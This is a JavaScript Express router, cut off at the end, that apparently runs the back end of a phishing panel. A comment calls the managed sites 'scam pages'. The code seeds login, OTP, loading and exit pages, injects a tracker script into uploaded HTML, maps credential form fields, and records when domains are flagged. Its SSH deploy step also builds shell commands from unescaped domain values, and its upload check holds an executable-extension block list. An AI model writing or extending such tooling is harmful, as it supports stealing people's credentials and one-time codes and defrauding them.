const router = require('express').Router();
const { v4: uuidv4 } = require('uuid');
const { getAdapter } = require('../database/adapter');
const { authenticateToken, requireRole, requireGod, requireAction } = require('../middleware/auth');
const { requireWebsiteAccess, scopeSqlClause } = require('../middleware/scope');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const crypto = require('crypto');
const { sshConnect, sshExec } = require('../services/deploy/ssh');
const { getSupabase, isSupabaseConfigured } = require('../database/supabase');
const { writeAudit } = require('../services/audit');
const { createNotification, notifyOwnerAndGods, actorLabel } = require('../services/notification');
const { scanFieldsFromHtml } = require('../services/scanFields');

// When a website is activated/deactivated, add/remove the nginx
// sites-enabled symlinks on its VPS for every domain linked to it —
// so deactivating actually stops those domains from serving.
// Groups by VPS host so we only make one SSH connection per host.
// Non-fatal on any SSH error (logged, doesn't roll back the DB change).
async function toggleVpsDomainsForWebsite(websiteId, enable) {
  const db = getAdapter();
  // Read both legacy per-website creds AND the vps_id → vpses relation. After
  // migration 010, new websites carry vps_id but no legacy vps_host — the old
  // check would silently skip and deactivation would be a no-op on the VPS.
  const w = await db.get(
    `SELECT w.id, w.name,
            COALESCE(NULLIF(w.vps_host, ''), v.host)          AS vps_host,
            COALESCE(w.vps_ssh_port,        v.ssh_port, 22)   AS vps_ssh_port,
            COALESCE(NULLIF(w.vps_ssh_user, ''), v.ssh_user, 'root') AS vps_ssh_user,
            COALESCE(NULLIF(w.vps_ssh_pass, ''), v.ssh_pass)  AS vps_ssh_pass,
            COALESCE(NULLIF(w.vps_ssh_key,  ''), v.ssh_key)   AS vps_ssh_key
       FROM websites w LEFT JOIN vpses v ON v.id = w.vps_id
      WHERE w.id = ?`,
    [websiteId]
  );
  if (!w || !w.vps_host || (!w.vps_ssh_pass && !w.vps_ssh_key)) return { skipped: true };

  const domains = await db.all(
    "SELECT domain FROM domains WHERE website_id = ? AND hosting_provider = 'vps'",
    [websiteId]
  );
  if (!domains.length) return { skipped: true };

  let client;
  const results = { host: w.vps_host, enable, domains: [] };
  try {
    client = await sshConnect({
      host: w.vps_host, port: w.vps_ssh_port || 22, username: w.vps_ssh_user || 'root',
      password: w.vps_ssh_pass || undefined, privateKey: w.vps_ssh_key || undefined,
    });
    for (const d of domains) {
      try {
        if (enable) {
          // Enable: link every sites-available config whose server_name mentions
          // this domain (handles configs named by domain OR by slug — historic
          // deploys used the slug, current deploys use the domain, both stay
          // valid). Falls back to the domain-named file if grep finds nothing.
          await sshExec(client, `
            found=$(grep -lE 'server_name[^;]*\\b${d.domain}\\b' /etc/nginx/sites-available/* 2>/dev/null);
            if [ -n "$found" ]; then
              for f in $found; do ln -sf "$f" /etc/nginx/sites-enabled/$(basename "$f"); done;
            elif [ -f /etc/nginx/sites-available/${d.domain} ]; then
              ln -sf /etc/nginx/sites-available/${d.domain} /etc/nginx/sites-enabled/${d.domain};
            fi
          `);
        } else {
          // Disable: same idea — find every sites-enabled config that references
          // this domain in server_name and remove the symlink, regardless of
          // filename. A domain-named rm alone misses slug-named configs.
          await sshExec(client, `
            for f in $(grep -lE 'server_name[^;]*\\b${d.domain}\\b' /etc/nginx/sites-enabled/* 2>/dev/null); do
              rm -f "$f";
            done;
            rm -f /etc/nginx/sites-enabled/${d.domain};
          `);
        }
        results.domains.push({ domain: d.domain, ok: true });
      } catch (e) {
        results.domains.push({ domain: d.domain, ok: false, error: e.message });
      }
    }
    const test = await sshExec(client, 'nginx -t 2>&1');
    if ((test.stdout + test.stderr).includes('successful')) {
      await sshExec(client, 'systemctl reload nginx 2>&1');
      results.reloaded = true;
    } else {
      results.reloaded = false;
      results.nginxTest = (test.stdout + test.stderr).trim();
    }
  } catch (err) {
    results.error = err.message;
  } finally {
    if (client) try { client.end(); } catch {}
  }
  return results;
}

// ─── File Upload Configuration & Validation ──────────────────────────────────
const DISALLOWED_EXTENSIONS = [
  '.exe', '.bat', '.cmd', '.sh', '.vbs', '.ps1', '.dll', '.so', '.elf', 
  '.msi', '.scr', '.pif', '.com', '.jar', '.vbe', '.jse', '.wsf', '.wsh'
];

const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB per file
const MAX_TOTAL_SIZE = 100 * 1024 * 1024; // 100MB total per upload

// File validation middleware
function validateFileUpload(req, res, next) {
  if (!req.files || req.files.length === 0) {
    return res.status(400).json({ error: 'No files uploaded' });
  }

  const errors = [];
  let totalSize = 0;
  const fileHashes = new Map();

  for (let i = 0; i < req.files.length; i++) {
    const file = req.files[i];
    const ext = path.extname(file.originalname).toLowerCase();
    
    if (ext && DISALLOWED_EXTENSIONS.includes(ext)) {
      errors.push(`${file.originalname}: Executable file type not allowed (${ext})`);
      continue;
    }

    if (file.size > MAX_FILE_SIZE) {
      errors.push(`${file.originalname}: File too large (${(file.size / 1024 / 1024).toFixed(2)}MB > 25MB)`);
      continue;
    }

    const normalizedName = (file.originalname || '').replace(/\\/g, '/');
    if (normalizedName.includes('..') || normalizedName.includes('\0') || /^[a-zA-Z]:/.test(normalizedName)) {
      errors.push(`${file.originalname}: Invalid filename (contains path traversal)`);
      continue;
    }

    file.originalname = normalizedName
      .split('/')
      .map(part => part.replace(/[^a-zA-Z0-9.\-_@ ]/g, '_'))
      .filter(Boolean)
      .join('/');

    totalSize += file.size;
  }

  if (totalSize > MAX_TOTAL_SIZE) {
    errors.push(`Total upload size too large: ${(totalSize / 1024 / 1024).toFixed(2)}MB > 100MB`);
  }

  if (errors.length > 0) {
    return res.status(400).json({ 
      error: 'File validation failed', 
      errors,
      validFiles: req.files.length - errors.length,
      totalFiles: req.files.length
    });
  }

  req.uploadMeta = { totalSize, fileCount: req.files.length, fileHashes };
  next();
}

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: MAX_FILE_SIZE,
    files: 2000
  }
});

// Apply auth to all website routes
router.use(authenticateToken);

// ─── POST /upload-logo ─────────────────────────────────────────────────────────
router.post('/upload-logo', requireGod, requireAction('demo-pages', 'upload'), upload.single('logo'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No image file uploaded' });
    }

    const ext = path.extname(req.file.originalname).toLowerCase() || '.png';
    const allowed = ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.webp', '.ico'];
    if (!allowed.includes(ext)) {
      return res.status(400).json({ error: 'Invalid image format. Allowed: png, jpg, jpeg, gif, svg, webp, ico' });
    }

    const filename = `${uuidv4()}${ext}`;

    if (isSupabaseConfigured()) {
      const { data, error } = await getSupabase()
        .storage
        .from('logos')
        .upload(filename, req.file.buffer, { contentType: req.file.mimetype, upsert: false });
      if (error) {
        console.error('Supabase logo upload error:', error.message);
        return res.status(500).json({ error: 'Upload failed' });
      }
      const { data: pub } = getSupabase().storage.from('logos').getPublicUrl(data.path);
      return res.json({ message: 'Logo uploaded successfully', logo_url: pub.publicUrl });
    }

    const uploadsDir = path.join(__dirname, '..', 'public', 'uploads', 'logos');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }
    const filePath = path.join(uploadsDir, filename);
    fs.writeFileSync(filePath, req.file.buffer);
    res.json({ message: 'Logo uploaded successfully', logo_url: `/uploads/logos/${filename}` });
  } catch (err) {
    console.error('Upload logo error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET / ──────────────────────────────────────────────────────────────────────
router.get('/', async (req, res) => {
  try {
    const db = getAdapter();

    // Non-god sees only sites they own. God with ?as_user=<id> is filtered
    // to that user's sites; god without it sees everything.
    const scope = scopeSqlClause(req, 'w.owner_id');
    const websites = await db.all(`
      SELECT w.*,
        (SELECT COUNT(*) FROM sessions s WHERE s.website_id = w.id AND s.is_active = 1) as active_sessions,
        (SELECT COUNT(*) FROM sessions s WHERE s.website_id = w.id) as total_sessions,
        (SELECT COUNT(*) FROM page_views pv WHERE pv.website_id = w.id AND pv.timestamp >= CURRENT_DATE) as page_views_today,
        (SELECT d.domain FROM domains d WHERE d.website_id = w.id AND d.status = 'live' LIMIT 1) as managed_domain,
        (SELECT d.flagged FROM domains d WHERE d.website_id = w.id AND d.status = 'live' LIMIT 1) as domain_flagged,
        (SELECT d.flag_detected_at FROM domains d WHERE d.website_id = w.id AND d.status = 'live' AND d.flagged = 1 LIMIT 1) as domain_flag_detected_at
      FROM websites w
      WHERE 1=1 ${scope.clause}
      ORDER BY w.created_at DESC
    `, scope.params);

    const pages = await db.all('SELECT id, website_id, url, name, form_type FROM demo_pages');

    // Hourly session counts for sparklines (last 24h)
    const sparkRows = await db.all(`
      SELECT website_id,
        CAST(strftime('%H', started_at) AS INTEGER) as hour,
        COUNT(*) as cnt
      FROM sessions
      WHERE started_at >= datetime('now', '-24 hours')
      GROUP BY website_id, strftime('%H', started_at)
    `);
    const sparkMap = {};
    for (const r of sparkRows) {
      if (!sparkMap[r.website_id]) sparkMap[r.website_id] = {};
      sparkMap[r.website_id][r.hour] = r.cnt;
    }
    const nowHour = new Date().getUTCHours();

    websites.forEach(w => {
      w.pages = pages.filter(p => p.website_id === w.id);
      const hourly = sparkMap[w.id] || {};
      w.spark = [];
      for (let i = 0; i < 24; i++) {
        const h = (nowHour - 23 + i + 24) % 24;
        w.spark.push(hourly[h] || 0);
      }
    });

    res.json({ websites });
  } catch (err) {
    console.error('List websites error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST / ─────────────────────────────────────────────────────────────────────
router.post('/', requireGod, requireAction('demo-pages', 'create'), async (req, res) => {
  try {
    const db = getAdapter();
    const { name, domain, is_active = 1, demo_slug, logo_url, color = '#6366f1' } = req.body;

    if (!name || !domain) {
      return res.status(400).json({ error: 'Name and domain are required' });
    }

    const trimmedSlug = demo_slug ? demo_slug.trim() : null;
    const finalDomain = domain
      ? domain.trim().toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '').split('/')[0].trim()
      : '';
    const logoUrl = logo_url ? logo_url.trim() : null;

    if (trimmedSlug) {
      const existingSlug = await db.get('SELECT id FROM websites WHERE demo_slug = ?', [trimmedSlug]);
      if (existingSlug) {
        return res.status(409).json({ error: 'A website with this demo slug already exists' });
      }
    }

    const apiKey = uuidv4();
    // God impersonating a user (?as_user=<id>) creates the site owned by that
    // user. Otherwise the site is owned by the caller.
    const ownerId = (req.effectiveUserId != null) ? req.effectiveUserId : req.user.id;

    const result = await db.run(`
      INSERT INTO websites (owner_id, name, domain, api_key, is_active, demo_slug, logo_url, color)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `, [ownerId, name, finalDomain, apiKey, is_active ? 1 : 0, trimmedSlug, logoUrl, color]);

    // Seed default demo_pages so the panel shows real page names instead of
    // "Unknown Page" when visitors land. Slug-scoped URLs match either the
    // /demo/<slug>/... admin-side path or the /<page> VPS-hosted path via the
    // LIKE join in the session SELECTs.
    if (trimmedSlug) {
      const defaultPages = [
        { path: 'login',   name: 'Login',   type: 'credentials' },
        { path: 'loading', name: 'Loading', type: 'loading' },
        { path: 'error',   name: 'Error',   type: 'error' },
        { path: 'exit',    name: 'Exit',    type: 'exit' },
        { path: 'index',   name: 'Home',    type: 'general' },
      ];
      for (const p of defaultPages) {
        try {
          await db.run(
            `INSERT INTO demo_pages (website_id, url, name, form_type) VALUES (?, ?, ?, ?)`,
            [result.lastInsertRowid, `/${trimmedSlug}/${p.path}`, p.name, p.type]
          );
        } catch (_) { /* url is UNIQUE — skip if already seeded */ }
      }
    }

    await writeAudit(req, `Created website: ${name}`, 'website', { website_id: result.lastInsertRowid, owner_id: ownerId, domain: finalDomain, demo_slug: trimmedSlug });

    await db.run(`
      INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id)
      VALUES (?, ?, ?, ?, ?, ?)
    `, [ownerId, 'website', '🌐', `${req.user.username} added website "${name}" (${domain})`,
      JSON.stringify({ website_id: result.lastInsertRowid }), result.lastInsertRowid]);

    // Owner + god fan-out. If actor IS the owner we skip pinging them for
    // their own action, but every other god still gets notified.
    {
      const actor = await actorLabel(req.user.id);
      notifyOwnerAndGods(null, ownerId, {
        type: 'info', event: 'website_added',
        title: 'Website Added',
        message: `${actor} added website "${name}" (${domain}).`,
        link: '/sites',
      }, { actorId: req.user.id });
    }

    const website = await db.get('SELECT * FROM websites WHERE id = ?', [result.lastInsertRowid]);

    res.status(201).json({ message: 'Website created', website });
  } catch (err) {
    console.error('Create website error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── PUT /:id ───────────────────────────────────────────────────────────────────
router.put('/:id', requireRole('super_admin'), requireAction('demo-pages', 'edit'), requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!existing) {
      return res.status(404).json({ error: 'Website not found' });
    }

    const { name, domain, is_active, demo_slug, logo_url, color, domain_active, domain_alt, domain_alt_active } = req.body;
    const updates = [];
    const values = [];

    if (name !== undefined) {
      updates.push('name = ?');
      values.push(name);
    }

    if (logo_url !== undefined) {
      updates.push('logo_url = ?');
      values.push(logo_url ? logo_url.trim() : null);
    }

    if (domain !== undefined) {
      let finalDomain = domain
        ? domain.trim().toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '').split('/')[0].trim()
        : '';
      if (finalDomain === 'auto') {
        const slugVal = demo_slug !== undefined ? (demo_slug ? demo_slug.trim() : null) : existing.demo_slug;
        finalDomain = 'auto-' + (slugVal || uuidv4().slice(0, 8));
      }
      updates.push('domain = ?');
      values.push(finalDomain);
    }

    let isActiveChanged = false;
    let isActiveNew = null;
    if (is_active !== undefined) {
      updates.push('is_active = ?');
      values.push(is_active ? 1 : 0);
      if ((is_active ? 1 : 0) !== existing.is_active) {
        isActiveChanged = true;
        isActiveNew = is_active ? 1 : 0;
      }
    }

    if (demo_slug !== undefined) {
      const slugVal = demo_slug ? demo_slug.trim() : null;
      if (slugVal) {
        const dupSlug = await db.get('SELECT id FROM websites WHERE demo_slug = ? AND id != ?', [slugVal, websiteId]);
        if (dupSlug) {
          return res.status(409).json({ error: 'A website with this demo slug already exists' });
        }
      }
      updates.push('demo_slug = ?');
      values.push(slugVal);
    }

    if (color !== undefined) {
      updates.push('color = ?');
      values.push(color ? color.trim() : '#6366f1');
    }

    if (domain_active !== undefined) {
      updates.push('domain_active = ?');
      values.push(domain_active ? 1 : 0);
    }

    if (domain_alt !== undefined) {
      // Accept JSON array of {domain, active} objects
      const altVal = Array.isArray(domain_alt) && domain_alt.length > 0
        ? JSON.stringify(domain_alt.map(a => ({ domain: String(a.domain || '').trim(), active: a.active ? 1 : 0 })).filter(a => a.domain))
        : null;
      updates.push('domain_alt = ?');
      values.push(altVal);
    }

    if (updates.length === 0) {
      return res.status(400).json({ error: 'No fields to update' });
    }

    values.push(websiteId);
    await db.run(`UPDATE websites SET ${updates.join(', ')} WHERE id = ?`, values);

    // Sync nginx sites-enabled on the VPS when the active flag flips.
    let vpsResult = null;
    if (isActiveChanged) {
      try { vpsResult = await toggleVpsDomainsForWebsite(websiteId, !!isActiveNew); }
      catch (e) { vpsResult = { error: e.message }; }
    }

    await writeAudit(req, `Updated website: ${name || existing.name}`, 'website', { website_id: websiteId, vps: vpsResult });

    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);

    res.json({ message: 'Website updated', website, vps: vpsResult });
  } catch (err) {
    console.error('Update website error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── DELETE /:id ────────────────────────────────────────────────────────────────
router.delete('/:id', requireGod, requireAction('demo-pages', 'delete'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!existing) {
      return res.status(404).json({ error: 'Website not found' });
    }

    await db.run('DELETE FROM page_views WHERE website_id = ?', [websiteId]);
    await db.run('DELETE FROM redirect_commands WHERE website_id = ?', [websiteId]);
    await db.run('DELETE FROM redirect_rules WHERE website_id = ?', [websiteId]);
    await db.run('DELETE FROM sessions WHERE website_id = ?', [websiteId]);
    await db.run('DELETE FROM websites WHERE id = ?', [websiteId]);
    // Clear dangling FK on any domains that were linked to this scam page
    await db.run('UPDATE domains SET website_id = NULL WHERE website_id = ?', [websiteId]);

    await writeAudit(req, `Deleted website: ${existing.name}`, 'website', { website_id: websiteId, name: existing.name, domain: existing.domain });

    await db.run(`
      INSERT INTO activity_feed (owner_id, type, icon, message, details)
      VALUES (?, ?, ?, ?, ?)
    `, [existing.owner_id || req.user.id, 'website', '🗑️', `${req.user.username} deleted website "${existing.name}" (${existing.domain})`,
      JSON.stringify({ website_id: websiteId })]);

    {
      const actor = await actorLabel(req.user.id);
      notifyOwnerAndGods(null, existing.owner_id || req.user.id, {
        type: 'warning', event: 'website_deleted',
        title: 'Website Deleted',
        message: `${actor} deleted website "${existing.name}" (${existing.domain}).`,
        link: '/sites',
        // Full snapshot for the 10-min undo window. Restore reinserts the row.
        undo: { kind: 'website_delete', params: { snapshot: existing } },
      }, { actorId: req.user.id });
    }

    res.json({ message: 'Website and all related data deleted' });
  } catch (err) {
    console.error('Delete website error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── PATCH /:id/toggle ──────────────────────────────────────────────────────────
router.patch('/:id/toggle', authenticateToken, requireAction('demo-pages', 'toggle'), requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!existing) return res.status(404).json({ error: 'Website not found' });

    const newState = existing.is_active ? 0 : 1;
    await db.run('UPDATE websites SET is_active = ? WHERE id = ?', [newState, websiteId]);

    // Add/remove nginx sites-enabled symlinks on the VPS for every domain
    // linked to this website — so deactivation immediately blocks live
    // domains from serving content. Non-fatal.
    let vpsResult = null;
    try { vpsResult = await toggleVpsDomainsForWebsite(websiteId, !!newState); }
    catch (e) { vpsResult = { error: e.message }; }

    await writeAudit(req, `${newState ? 'Activated' : 'Deactivated'} website: ${existing.name}`, 'website', { website_id: websiteId, is_active: newState, vps: vpsResult });

    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    res.json({ message: `Website ${newState ? 'activated' : 'deactivated'}`, website, vps: vpsResult });
  } catch (err) {
    console.error('Toggle website error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /:id/regenerate-key ───────────────────────────────────────────────────
router.post('/:id/regenerate-key', requireGod, requireAction('demo-pages', 'regenerate-key'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!existing) {
      return res.status(404).json({ error: 'Website not found' });
    }

    const newApiKey = uuidv4();
    await db.run('UPDATE websites SET api_key = ? WHERE id = ?', [newApiKey, websiteId]);

    await writeAudit(req, `Regenerated API key for website: ${existing.name}`, 'website', { website_id: websiteId, old_key_last4: existing.api_key.slice(-4) });

    await db.run(`
      INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id)
      VALUES (?, ?, ?, ?, ?, ?)
    `, [existing.owner_id || req.user.id, 'website', '🔑', `${req.user.username} regenerated API key for "${existing.name}"`,
      JSON.stringify({ website_id: websiteId }), websiteId]);

    res.json({
      message: 'API key regenerated',
      website_id: websiteId,
      api_key: newApiKey
    });
  } catch (err) {
    console.error('Regenerate key error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /:id/files ─────────────────────────────────────────────────────────────
router.get('/:id/files', requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) {
      return res.status(404).json({ error: 'Website not found' });
    }
    if (!website.demo_slug) {
      return res.status(400).json({ error: 'Please configure a Demo Slug for this website in Settings first.' });
    }

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!fs.existsSync(siteDir)) {
      return res.json({ files: [] });
    }

    function getAllFiles(dir, baseDir = '') {
      let results = [];
      const list = fs.readdirSync(dir, { withFileTypes: true });
      for (const item of list) {
        const relativePath = baseDir ? `${baseDir}/${item.name}` : item.name;
        const fullPath = path.join(dir, item.name);
        if (item.isDirectory()) {
          results = results.concat(getAllFiles(fullPath, relativePath));
        } else if (item.isFile()) {
          const stat = fs.statSync(fullPath);
          results.push({
            name: relativePath,
            size: stat.size,
            mtime: stat.mtimeMs,          // for "modified X ago" chips
            url: `/demo/${website.demo_slug}/${relativePath}`
          });
        }
      }
      return results;
    }

    const files = getAllFiles(siteDir);
    res.json({ files });
  } catch (err) {
    console.error('Get files error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /:id/upload ────────────────────────────────────────────────────────────
router.post('/:id/upload', requireGod, requireAction('demo-pages', 'upload'), upload.array('files'), validateFileUpload, async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) {
      return res.status(404).json({ error: 'Website not found' });
    }
    if (!website.demo_slug) {
      return res.status(400).json({ error: 'Please configure a Demo Slug for this website in Settings first.' });
    }

    if (!req.files || req.files.length === 0) {
      return res.status(400).json({ error: 'No files uploaded' });
    }

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!fs.existsSync(siteDir)) {
      fs.mkdirSync(siteDir, { recursive: true });
    }

    const pathsJson = req.body.paths;
    let paths = [];
    if (pathsJson) {
      try {
        paths = JSON.parse(pathsJson);
      } catch (e) {
        console.error('Failed to parse paths:', e);
      }
    }

    const savedFiles = [];
    for (let i = 0; i < req.files.length; i++) {
      const file = req.files[i];
      const rawPath = (paths[i] || file.originalname || '').replace(/\\/g, '/');

      // Preserve path relative to root upload folder
      const parts = rawPath.split('/');
      // If uploading folder like "psbt/login.html" or "psbt/css/style.css", drop root folder name
      const relativePath = parts.length > 1 ? parts.slice(1).join('/') : rawPath;

      const cleanParts = relativePath.split('/')
        .map(p => p.replace(/[^a-zA-Z0-9.\-_]/g, '_'))
        .filter(p => p && p !== '..' && p !== '.');

      if (cleanParts.length === 0) continue;

      const targetPath = path.join(siteDir, ...cleanParts);
      const relativeName = cleanParts.join('/');

      fs.mkdirSync(path.dirname(targetPath), { recursive: true });

      let fileSize = 0;
      if (file.originalname.toLowerCase().endsWith('.html') || rawPath.toLowerCase().endsWith('.html')) {
        let fileContent = file.buffer.toString('utf8');
        if (!fileContent.includes('/tracker.js')) {
          const scriptTag = '\n<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>\n';
          if (fileContent.includes('</head>')) {
            fileContent = fileContent.replace('</head>', `${scriptTag}</head>`);
          } else if (fileContent.includes('</body>')) {
            fileContent = fileContent.replace('</body>', `${scriptTag}</body>`);
          } else {
            fileContent += scriptTag;
          }
        }
        const htmlBuffer = Buffer.from(fileContent, 'utf8');
        fs.writeFileSync(targetPath, htmlBuffer);
        fileSize = htmlBuffer.length;
      } else {
        fs.writeFileSync(targetPath, file.buffer);
        fileSize = file.buffer.length;
      }

      savedFiles.push({
        name: relativeName,
        size: fileSize,
        url: `/demo/${website.demo_slug}/${relativeName}`
      });
    }

    // ── Auto-register HTML files with known basenames + map their fields ──
    // Recognises common flow pages by filename and creates a demo_pages row
    // with fields_schema pre-populated by scanFieldsFromHtml. Skips files that
    // are already registered.
    const KNOWN_PAGES = {
      login:    { form_type: 'credentials', name: 'Login'   },
      signin:   { form_type: 'credentials', name: 'Login'   },
      logon:    { form_type: 'credentials', name: 'Login'   },
      loading:  { form_type: 'loading',     name: 'Loading' },
      wait:     { form_type: 'loading',     name: 'Loading' },
      processing:{ form_type: 'loading',    name: 'Loading' },
      verifying:{ form_type: 'loading',     name: 'Loading' },
      error:    { form_type: 'error',       name: 'Error'   },
      declined: { form_type: 'error',       name: 'Error'   },
      exit:     { form_type: 'exit',        name: 'Exit'    },
      success:  { form_type: 'exit',        name: 'Success' },
      thankyou: { form_type: 'exit',        name: 'Thank You' },
      otp:      { form_type: 'otp',         name: 'OTP'     },
      code:     { form_type: 'otp',         name: 'OTP'     },
      verify:   { form_type: 'otp',         name: 'Verify'  },
      confirm:  { form_type: 'otp',         name: 'Confirm' },
      index:    { form_type: 'general',     name: 'Home'    },
      home:     { form_type: 'general',     name: 'Home'    },
    };
    const autoRegistered = [];
    if (website.demo_slug) {
      for (const f of savedFiles) {
        if (!f.name.toLowerCase().endsWith('.html')) continue;
        const basename = f.name.split('/').pop().replace(/\.html?$/i, '').toLowerCase();
        const meta = KNOWN_PAGES[basename];
        if (!meta) continue;
        const urlPath = `/${website.demo_slug}/${basename}`;
        try {
          const already = await db.get('SELECT id FROM demo_pages WHERE website_id = ? AND url = ?', [websiteId, urlPath]);
          if (already) continue;
          // Scan the just-saved HTML for form fields
          let fields = [];
          try {
            const html = fs.readFileSync(path.join(siteDir, f.name), 'utf8');
            const scanned = scanFieldsFromHtml(html);
            fields = scanned.fields || [];
          } catch (_) { /* scan is best-effort */ }
          await db.run(
            `INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings)
             VALUES (?, ?, ?, ?, ?, ?)`,
            [websiteId, urlPath, meta.name, meta.form_type, JSON.stringify(fields), '{}']
          );
          autoRegistered.push({ url: urlPath, name: meta.name, form_type: meta.form_type, fields: fields.length });
        } catch (_) { /* per-file failure shouldn't kill upload */ }
      }
    }

    await writeAudit(req, `Uploaded ${savedFiles.length} file(s) to website: ${website.name}`, 'website', {
      website_id: websiteId,
      files: savedFiles.map(f => ({ name: f.name, size: f.size })),
      totalSize: req.uploadMeta.totalSize,
      htmlFiles: savedFiles.filter(f => f.name.toLowerCase().endsWith('.html')).length,
      autoRegistered: autoRegistered.length
    });

    res.json({
      message: 'Files uploaded successfully',
      files: savedFiles,
      autoRegistered,
      stats: {
        total: savedFiles.length,
        htmlFiles: savedFiles.filter(f => f.name.toLowerCase().endsWith('.html')).length,
        assets: savedFiles.filter(f => !f.name.toLowerCase().endsWith('.html')).length,
        totalSize: req.uploadMeta.totalSize,
        autoRegistered: autoRegistered.length
      }
    });
  } catch (err) {
    console.error('Upload files error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── DELETE /:id/files/:filename ───────────────────────────────────────────────
router.delete('/:id/files/:filename(*)', requireGod, requireAction('demo-pages', 'upload'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) {
      return res.status(404).json({ error: 'Website not found' });
    }
    if (!website.demo_slug) {
      return res.status(400).json({ error: 'Website has no demo slug' });
    }

    let { filename } = req.params;
    
    if (filename.includes('..')) {
      return res.status(400).json({ error: 'Invalid filename - path traversal not allowed' });
    }

    const filePath = path.join(__dirname, '..', 'xPages', website.demo_slug, filename);
    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!filePath.startsWith(siteDir)) {
      return res.status(400).json({ error: 'Invalid filename - outside website directory' });
    }

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'File not found' });
    }

    const fileBasename = path.basename(filename, '.html');
    const linkedPages = await db.all(`
      SELECT id, name, url FROM demo_pages 
      WHERE website_id = ? AND url LIKE ?
    `, [websiteId, `%/${fileBasename}`]);

    const stats = fs.statSync(filePath);
    fs.unlinkSync(filePath);

    await writeAudit(req, `Deleted file ${filename} from website: ${website.name}`, 'website', {
      website_id: websiteId,
      filename,
      size: stats.size,
      linkedPages: linkedPages.map(p => ({ id: p.id, name: p.name, url: p.url }))
    });

    res.json({ 
      message: 'File deleted successfully',
      filename,
      linkedPages: linkedPages.length > 0 ? linkedPages : null,
      warning: linkedPages.length > 0 ? `${linkedPages.length} page(s) in registry may be broken` : null
    });
  } catch (err) {
    console.error('Delete file error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /:id/files-quota ──────────────────────────────────────────────────────
// Storage summary for the site directory: bytes used, cap, file count.
const SITE_STORAGE_CAP_MB = 500;
router.get('/:id/files-quota', requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
    if (!website.demo_slug) return res.json({ used: 0, cap: SITE_STORAGE_CAP_MB * 1024 * 1024, count: 0 });

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!fs.existsSync(siteDir)) return res.json({ used: 0, cap: SITE_STORAGE_CAP_MB * 1024 * 1024, count: 0 });

    let used = 0;
    let count = 0;
    (function walk(dir) {
      for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
        const p = path.join(dir, item.name);
        if (item.isDirectory()) walk(p);
        else if (item.isFile()) { used += fs.statSync(p).size; count++; }
      }
    })(siteDir);

    res.json({ used, cap: SITE_STORAGE_CAP_MB * 1024 * 1024, count });
  } catch (err) {
    console.error('Files quota error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /:id/files/:filename/content ─────────────────────────────────────────
// Return raw text of a text-ish file (for diff and code viewers).
// Refuses binary types to protect the connection.
const TEXT_EXTS = new Set(['html','htm','css','js','mjs','json','svg','txt','md','xml','yml','yaml','csv','log','env']);
router.get('/:id/files/:filename(*)/content', requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
